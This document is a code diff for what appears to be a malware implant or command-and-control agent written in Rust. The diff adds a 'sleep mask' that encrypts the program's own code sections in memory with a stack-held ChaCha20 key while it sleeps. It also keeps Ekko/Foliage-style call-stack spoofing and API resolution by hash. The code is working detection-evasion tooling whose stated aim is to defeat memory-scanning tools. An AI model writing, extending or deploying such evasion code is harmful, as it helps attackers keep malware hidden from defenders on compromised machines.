@@ -1,9 +1,10 @@
 use common::config::SleepConfig;
 use anyhow::Result;
+#[cfg(windows)]
 use common::config::SleepMethod;
 use log::debug;
 use log::info;
-use rand::{thread_rng, Rng};
+use rand::{thread_rng, Rng, RngCore as _};
 
 pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
     let mut base = config.base_interval_secs as f64;
@@ -59,75 +60,146 @@ pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
 }
 
 #[cfg(windows)]
-pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Result<()> {
-    match method {
+pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Result<()> {
+    match &config.method {
         SleepMethod::Ekko | SleepMethod::Foliage => {
             info!("Initiating Foliage-style sleep for {:?}", duration);
             #[cfg(target_arch = "x86_64")]
             unsafe {
                 // Foliage uses NtDelayExecution
 
-                crypto::encrypt_sections();
-                // Populate SLEEP_DURATION_NS before switching to the sleep fiber
-                // so the fiber knows how long to sleep (was always 0 before = no-op spoof).
-                spoof::SLEEP_DURATION_NS.with(|c| c.set(duration.as_nanos() as u64));
-                let fiber_switched = spoof::spoof_stack();
-                spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
+                if config.sleep_mask_enabled {
+                    // Stack-local key: held in this frame, not in any global or
+                    // thread-local, for the duration of the sleep window.
+                    let mut key = [0u8; 32];
+                    rand::thread_rng().fill_bytes(&mut key);
+                    let mut sections = stack_mask::encrypt_with_key(&key);
 
-                if fiber_switched {
-                    // The sleep fiber already slept for the requested duration.
-                    let _ = spoof::restore_stack();
-                    crypto::decrypt_sections();
-                    return Ok(());
-                }
+                    spoof::SLEEP_DURATION_NS.with(|c| c.set(duration.as_nanos() as u64));
+                    let fiber_switched = spoof::spoof_stack();
+                    spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
 
-                let duration_100ns = -(duration.as_nanos() as i64 / 100);
-                let mut delay = duration_100ns;
+                    if fiber_switched {
+                        let _ = spoof::restore_stack();
+                        stack_mask::decrypt_with_key(&mut sections, &key);
+                        core::ptr::write_volatile(&mut key, [0u8; 32]);
+                        return Ok(());
+                    }
 
-                let ntdll =
-                    pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
-                let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(
-                    ntdll.unwrap_or(0),
-                    pe_resolve::hash_str(b"NtDelayExecution\0"),
-                )
-                .unwrap_or(0);
-                let addr = nt_delay_execution_addr as *const ();
-                if !addr.is_null() {
-                    // Correct NtDelayExecution signature:
-                    //   NTSTATUS NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
-                    // BOOLEAN is a 1-byte unsigned integer (u8), NOT i32.
-                    // The previous i32 declaration only worked by x64 calling-
-                    // convention coincidence (H-4).
-                    let function: extern "system" fn(u8, *mut i64) -> i32 =
-                        std::mem::transmute(addr);
-                    function(0, &mut delay as *mut i64);
+                    let duration_100ns = -(duration.as_nanos() as i64 / 100);
+                    let mut delay = duration_100ns;
+
+                    let ntdll =
+                        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
+                    let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(
+                        ntdll.unwrap_or(0),
+                        pe_resolve::hash_str(b"NtDelayExecution\0"),
+                    )
+                    .unwrap_or(0);
+                    let addr = nt_delay_execution_addr as *const ();
+                    if !addr.is_null() {
+                        let function: extern "system" fn(u8, *mut i64) -> i32 =
+                            std::mem::transmute(addr);
+                        function(0, &mut delay as *mut i64);
+                    } else {
+                        std::thread::sleep(duration);
+                    }
+
+                    stack_mask::decrypt_with_key(&mut sections, &key);
+                    core::ptr::write_volatile(&mut key, [0u8; 32]);
                 } else {
-                    // Last-resort fallback if NtDelayExecution cannot be resolved.
-                    std::thread::sleep(duration);
-                } // close if !addr.is_null()
+                    crypto::encrypt_sections();
+                    // Populate SLEEP_DURATION_NS before switching to the sleep fiber
+                    // so the fiber knows how long to sleep (was always 0 before = no-op spoof).
+                    spoof::SLEEP_DURATION_NS.with(|c| c.set(duration.as_nanos() as u64));
+                    let fiber_switched = spoof::spoof_stack();
+                    spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
 
-                crypto::decrypt_sections();
+                    if fiber_switched {
+                        // The sleep fiber already slept for the requested duration.
+                        let _ = spoof::restore_stack();
+                        crypto::decrypt_sections();
+                        return Ok(());
+                    }
+
+                    let duration_100ns = -(duration.as_nanos() as i64 / 100);
+                    let mut delay = duration_100ns;
+
+                    let ntdll =
+                        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
+                    let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(
+                        ntdll.unwrap_or(0),
+                        pe_resolve::hash_str(b"NtDelayExecution\0"),
+                    )
+                    .unwrap_or(0);
+                    let addr = nt_delay_execution_addr as *const ();
+                    if !addr.is_null() {
+                        // Correct NtDelayExecution signature:
+                        //   NTSTATUS NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
+                        // BOOLEAN is a 1-byte unsigned integer (u8), NOT i32.
+                        // The previous i32 declaration only worked by x64 calling-
+                        // convention coincidence (H-4).
+                        let function: extern "system" fn(u8, *mut i64) -> i32 =
+                            std::mem::transmute(addr);
+                        function(0, &mut delay as *mut i64);
+                    } else {
+                        // Last-resort fallback if NtDelayExecution cannot be resolved.
+                        std::thread::sleep(duration);
+                    } // close if !addr.is_null()
+
+                    crypto::decrypt_sections();
+                }
             } // close unsafe
             #[cfg(not(target_arch = "x86_64"))]
             std::thread::sleep(duration);
             Ok(())
         }
         _ => {
-            info!("Standard sleep for {:?}", duration);
-            std::thread::sleep(duration);
+            if config.sleep_mask_enabled {
+                info!("Sleep-mask active for {:?}", duration);
+                unsafe {
+                    let mut key = [0u8; 32];
+                    rand::thread_rng().fill_bytes(&mut key);
+                    let mut sections = stack_mask::encrypt_with_key(&key);
+                    std::thread::sleep(duration);
+                    stack_mask::decrypt_with_key(&mut sections, &key);
+                    core::ptr::write_volatile(&mut key, [0u8; 32]);
+                }
+            } else {
+                info!("Standard sleep for {:?}", duration);
+                std::thread::sleep(duration);
+            }
             Ok(())
         }
     }
 }
 
-/// Non-Windows sleep-time memory encryption.
-/// Encrypts executable sections before sleeping and decrypts on wake.
+/// Non-Windows sleep with optional sleep-mask encryption.
+///
+/// When `config.sleep_mask_enabled` is `true`, the `.text` and `.rdata`
+/// sections are encrypted with a per-sleep ChaCha20 key held on the stack
+/// for the duration of the sleep window.  When `false`, the existing
+/// `crypto::encrypt_sections` path (heap key page) is used unchanged.
 #[cfg(not(windows))]
-pub fn execute_sleep(duration: std::time::Duration, _method: &SleepMethod) -> Result<()> {
-    info!("Sleep-time memory encryption active for {:?}", duration);
-    crypto::encrypt_sections();
-    std::thread::sleep(duration);
-    crypto::decrypt_sections();
+pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Result<()> {
+    if config.sleep_mask_enabled {
+        info!("Sleep-mask active (stack-local key) for {:?}", duration);
+        unsafe {
+            let mut key = [0u8; 32];
+            rand::thread_rng().fill_bytes(&mut key);
+            let mut sections = stack_mask::encrypt_with_key(&key);
+            std::thread::sleep(duration);
+            stack_mask::decrypt_with_key(&mut sections, &key);
+            // Volatile write to prevent the compiler from treating the zero
+            // as a dead store.
+            core::ptr::write_volatile(&mut key, [0u8; 32]);
+        }
+    } else {
+        info!("Sleep-time memory encryption active for {:?}", duration);
+        crypto::encrypt_sections();
+        std::thread::sleep(duration);
+        crypto::decrypt_sections();
+    }
     Ok(())
 }
 
@@ -229,7 +301,7 @@ pub mod crypto {
     // ── Memory-protection helpers ─────────────────────────────────────────
 
     #[cfg(windows)]
-    unsafe fn protect_region(addr: *mut u8, size: usize, new_protect: u32, old_protect: &mut u32) -> bool {
+    pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, new_protect: u32, old_protect: &mut u32) -> bool {
         let mut region_size = size;
         let mut base_addr = addr as *mut winapi::ctypes::c_void;
 
@@ -266,7 +338,7 @@ pub mod crypto {
     }
 
     #[cfg(not(windows))]
-    unsafe fn protect_region(addr: *mut u8, size: usize, prot: i32) -> bool {
+    pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, prot: i32) -> bool {
         let page_size = libc::sysconf(libc::_SC_PAGESIZE);
         let page_size = if page_size > 0 { page_size as usize } else { 4096usize };
         let aligned = (addr as usize) & !(page_size - 1);
@@ -285,7 +357,7 @@ pub mod crypto {
     // ── Section discovery ─────────────────────────────────────────────────
 
     #[cfg(windows)]
-    unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
+    pub(super) unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
         use winapi::um::winnt::{
             IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
             IMAGE_SECTION_HEADER,
@@ -341,7 +413,7 @@ pub mod crypto {
     /// Parse /proc/self/maps to find executable and read-only sections belonging
     /// to the current binary.  Returns (addr, size, original_prot) tuples.
     #[cfg(not(windows))]
-    unsafe fn get_code_sections() -> Vec<(*mut u8, usize, i32)> {
+    pub(super) unsafe fn get_code_sections() -> Vec<(*mut u8, usize, i32)> {
         use std::io::{BufRead, BufReader};
         let exe_path = match std::env::current_exe() {
             Ok(p) => p.to_string_lossy().to_string(),
@@ -659,6 +731,181 @@ pub mod crypto {
             free_key_page(kp, kplen);
             KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
             KEY_PAGE_LEN.with(|c| c.set(0));
+        }
+    }
+}
+
+/// Stack-local-key section encryption helpers for the sleep-mask feature.
+///
+/// Unlike the [`crypto`] module, which allocates a separate memory page for
+/// the session key, these helpers accept the 32-byte key by reference so the
+/// caller can hold it in a **stack-local** variable.  Only the per-section
+/// nonces and addresses are stored on the heap (inside the returned
+/// `Vec<SectionEntry>`).  This prevents memory-scanning tools from locating
+/// the key via known global or thread-local offsets.
+pub mod stack_mask {
+    use chacha20::ChaCha20;
+    use chacha20::cipher::{KeyIvInit, StreamCipher};
+    use rand::RngCore;
+
+    /// Per-section state required to decrypt after sleep.
+    pub struct SectionEntry {
+        pub addr: *mut u8,
+        pub len: usize,
+        /// Original page-protection flags (Windows PAGE_* or POSIX PROT_*).
+        pub orig_prot: u32,
+        /// Per-section ChaCha20 nonce (12 bytes); zeroed after decryption.
+        pub nonce: [u8; 12],
+    }
+
+    // SAFETY: SectionEntry holds a raw pointer into the current process image.
+    // Access is confined to the single calling thread within `execute_sleep`.
+    unsafe impl Send for SectionEntry {}
+    unsafe impl Sync for SectionEntry {}
+
+    /// Encrypt all code sections in-place using `key`.
+    ///
+    /// For each section the page is made writable with `VirtualProtect`, the
+    /// bytes are XOR'd with a ChaCha20 keystream, and the original protection
+    /// is restored.  Returns per-section state needed for decryption.
+    #[cfg(windows)]
+    pub unsafe fn encrypt_with_key(key: &[u8; 32]) -> Vec<SectionEntry> {
+        let sections = super::crypto::get_code_sections();
+        let mut result = Vec::with_capacity(sections.len());
+        for (addr, size) in sections {
+            if addr.is_null() || size == 0 {
+                continue;
+            }
+            let mut orig_prot = 0u32;
+            if !super::crypto::protect_region(
+                addr,
+                size,
+                winapi::um::winnt::PAGE_READWRITE,
+                &mut orig_prot,
+            ) {
+                continue;
+            }
+            let mut nonce = [0u8; 12];
+            rand::thread_rng().fill_bytes(&mut nonce);
+            {
+                let mut cipher = ChaCha20::new(
+                    chacha20::Key::from_slice(key),
+                    chacha20::Nonce::from_slice(&nonce),
+                );
+                cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+            }
+            // Restore original protection so that page-permission bookkeeping
+            // matches OS expectations throughout the sleep window.
+            let mut dummy = 0u32;
+            let _ = super::crypto::protect_region(addr, size, orig_prot, &mut dummy);
+            result.push(SectionEntry { addr, len: size, orig_prot, nonce });
+        }
+        result
+    }
+
+    /// Decrypt sections previously encrypted by [`encrypt_with_key`].
+    ///
+    /// Each section is made writable, XOR'd with the same keystream to recover
+    /// the original bytes, and the original protection is restored.
+    /// Per-section nonces are zeroed in place after use.
+    #[cfg(windows)]
+    pub unsafe fn decrypt_with_key(sections: &mut Vec<SectionEntry>, key: &[u8; 32]) {
+        for section in sections.iter_mut() {
+            if section.addr.is_null() || section.len == 0 {
+                continue;
+            }
+            let mut dummy = 0u32;
+            if !super::crypto::protect_region(
+                section.addr,
+                section.len,
+                winapi::um::winnt::PAGE_READWRITE,
+                &mut dummy,
+            ) {
+                core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
+                continue;
+            }
+            {
+                let mut cipher = ChaCha20::new(
+                    chacha20::Key::from_slice(key),
+                    chacha20::Nonce::from_slice(&section.nonce),
+                );
+                cipher.apply_keystream(
+                    std::slice::from_raw_parts_mut(section.addr, section.len),
+                );
+            }
+            core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
+            let mut dummy2 = 0u32;
+            let _ = super::crypto::protect_region(
+                section.addr,
+                section.len,
+                section.orig_prot,
+                &mut dummy2,
+            );
+        }
+    }
+
+    /// Non-Windows: encrypt using `mprotect` to make sections writable.
+    #[cfg(not(windows))]
+    pub unsafe fn encrypt_with_key(key: &[u8; 32]) -> Vec<SectionEntry> {
+        let sections = super::crypto::get_code_sections();
+        let mut result = Vec::with_capacity(sections.len());
+        for (addr, size, orig_prot) in sections {
+            if addr.is_null() || size == 0 {
+                continue;
+            }
+            if !super::crypto::protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
+                continue;
+            }
+            let mut nonce = [0u8; 12];
+            rand::thread_rng().fill_bytes(&mut nonce);
+            {
+                let mut cipher = ChaCha20::new(
+                    chacha20::Key::from_slice(key),
+                    chacha20::Nonce::from_slice(&nonce),
+                );
+                cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+            }
+            let _ = super::crypto::protect_region(addr, size, orig_prot);
+            result.push(SectionEntry {
+                addr,
+                len: size,
+                orig_prot: orig_prot as u32,
+                nonce,
+            });
+        }
+        result
+    }
+
+    /// Non-Windows: decrypt using `mprotect` to make sections writable.
+    #[cfg(not(windows))]
+    pub unsafe fn decrypt_with_key(sections: &mut Vec<SectionEntry>, key: &[u8; 32]) {
+        for section in sections.iter_mut() {
+            if section.addr.is_null() || section.len == 0 {
+                continue;
+            }
+            if !super::crypto::protect_region(
+                section.addr,
+                section.len,
+                libc::PROT_READ | libc::PROT_WRITE,
+            ) {
+                core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
+                continue;
+            }
+            {
+                let mut cipher = ChaCha20::new(
+                    chacha20::Key::from_slice(key),
+                    chacha20::Nonce::from_slice(&section.nonce),
+                );
+                cipher.apply_keystream(
+                    std::slice::from_raw_parts_mut(section.addr, section.len),
+                );
+            }
+            core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
+            let _ = super::crypto::protect_region(
+                section.addr,
+                section.len,
+                section.orig_prot as i32,
+            );
         }
     }
 }
